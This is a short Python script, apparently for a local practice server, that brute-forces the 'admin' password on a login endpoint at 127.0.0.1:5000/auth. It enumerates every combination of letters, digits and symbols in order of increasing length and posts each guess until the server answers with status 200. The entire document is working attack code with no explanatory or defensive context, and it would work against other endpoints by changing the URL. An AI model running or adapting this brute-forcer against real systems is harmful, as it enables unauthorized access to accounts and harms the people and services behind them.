import requests

letters = 'abcdefgihjklmnopqrstuvwxyz'
upper_letters = 'ABCDEFGIHJKLMNOPQRSTUVWXYZ'
digits = '0123456789'
symbols = '!@#$%^&*()_+-='

alphabet = letters + digits + upper_letters + symbols
base = len(alphabet)


length = 0
counter = 0

while True:

    password = ''

    temp = counter
    while temp > 0:
        rest = temp % base
        temp = temp // base
        password = alphabet[rest] + password

    while len(password) < length:
        password = alphabet[0] + password

    print(password)
    response = requests.post('http://127.0.0.1:5000/auth',
                             json={'login': 'admin', 'password': password})
    if response.status_code == 200:
        print(password)
        break

    if password == alphabet[-1] * length:
        length += 1
        counter = 0
    else:
        counter += 1